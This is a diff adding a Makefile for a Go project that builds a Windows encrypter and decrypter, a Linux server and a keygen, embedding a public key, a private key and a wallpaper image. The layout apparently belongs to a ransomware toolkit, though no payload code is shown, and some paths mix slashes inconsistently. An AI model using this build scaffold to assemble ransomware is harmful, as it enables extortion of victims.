@@ -1,0 +1,41 @@
+all: build
+
+PROJECT_DIR := $(shell pwd)
+BIN_DIR     := $(PROJECT_DIR)/bin
+
+# ldflags
+LDFLAGS_CONSOLE := "-s -w"
+LDFLAGS_GUI     := "-H=windowsgui -s -w"
+
+requirements:
+	go mod download
+	go install -v github.com\akavel\rsrc@latest
+	go install -v github.com\go-bindata\go-bindata\go-bindata@latest
+	
+keys:
+	cd $(PROJECT_DIR)\Keygen && go build -o $(BIN_DIR)\keygen.exe .
+
+pre-build:
+	go-bindata -pkg assets -o $(PROJECT_DIR)/assets/assets.go ./assets/public_key.pem ./assets/wallpaper.jpg
+	rsrc -manifest $(PROJECT_DIR)/assets/encrypt.manifest -ico $(PROJECT_DIR)/assets/icon.ico -o $(PROJECT_DIR)/Encrypt/encrypter.syso
+
+	go-bindata -pkg secret -o $(PROJECT_DIR)/assets/secret/private_key.go ./assets/private_key.pem
+	rsrc -manifest $(PROJECT_DIR)/assets/decrypt.manifest -ico $(PROJECT_DIR)/assets/icon.ico -o $(PROJECT_DIR)/Decrypt/decrypter.syso
+
+build: pre-build
+	cd $(PROJECT_DIR)/Encrypt && GOOS=windows GOARCH=386 go build -ldflags $(LDFLAGS_CONSOLE) -o $(BIN_DIR)/encrypt.exe .
+	cd $(PROJECT_DIR)/Decrypt && GOOS=windows GOARCH=386 go build -ldflags $(LDFLAGS_CONSOLE) -o $(BIN_DIR)/decrypt.exe .
+	cd $(PROJECT_DIR)/Server  && GOOS=linux   GOARCH=386 go build -ldflags $(LDFLAGS_CONSOLE) -o $(BIN_DIR)/Server .
+
+encrypt: pre-build
+	cd $(PROJECT_DIR)/Encrypt && GOOS=windows GOARCH=386 go build -ldflags $(LDFLAGS_CONSOLE) -o $(BIN_DIR)/encrypt.exe .
+
+decrypt: pre-build
+	cd $(PROJECT_DIR)/Decrypt && GOOS=windows GOARCH=386 go build -ldflags $(LDFLAGS_CONSOLE) -o $(BIN_DIR)/decrypt.exe .
+
+backend:
+	go-bindata -pkg secret -o $(PROJECT_DIR)/assets/secret/private_key.go ./assets/private_key.pem
+	cd $(PROJECT_DIR)/Server && GOOS=linux GOARCH=386 go build -ldflags $(LDFLAGS_CONSOLE) -o $(BIN_DIR)/Server .
+
+clean:
+	rm -f $(BIN_DIR)/encrypt.exe $(BIN_DIR)/decrypt.exe $(BIN_DIR)/Server
